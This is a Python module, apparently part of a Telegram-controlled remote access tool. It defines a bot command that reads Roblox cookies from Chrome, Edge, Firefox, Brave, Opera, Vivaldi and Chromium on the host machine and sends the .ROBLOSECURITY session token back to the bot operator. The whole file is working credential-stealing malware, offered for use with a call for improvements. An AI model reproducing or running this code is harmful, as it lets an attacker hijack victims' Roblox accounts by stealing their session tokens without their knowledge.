##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


# forked from https://github.com/cybermads/Letrium.git
# author: cyberman


from aiogram import types, F
from aiogram.filters import Command
import browser_cookie3

from config import ALLOWED_USER_ID
from lib.text.texts import TEXTS, user_languages


PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]

 
def register_roblosecurity_handler(dp):
    @dp.message((F.text.lower() == "роблокс куки") | (F.text.lower() == "roblox cookie"))
    @dp.message(Command("robloxcookie"))
    async def robloxcookie(message: types.Message):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id != ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]["no_access"])
            return

        await message.answer(TEXTS[lang]["robloxcookie_start"])

        found = False
        for local in PATHS:
            try:
                cookies = getattr(browser_cookie3, local)(domain_name='roblox.com')
                for cookie in cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        await message.answer(f"ROBLOSECURITY: `{cookie.value}`", parse_mode="Markdown")
                        found = True
                        break
                if found:
                    break
            except Exception:
                continue

        if not found:
            await message.answer(TEXTS[lang]["robloxcookie_not_found"])
        

            
        
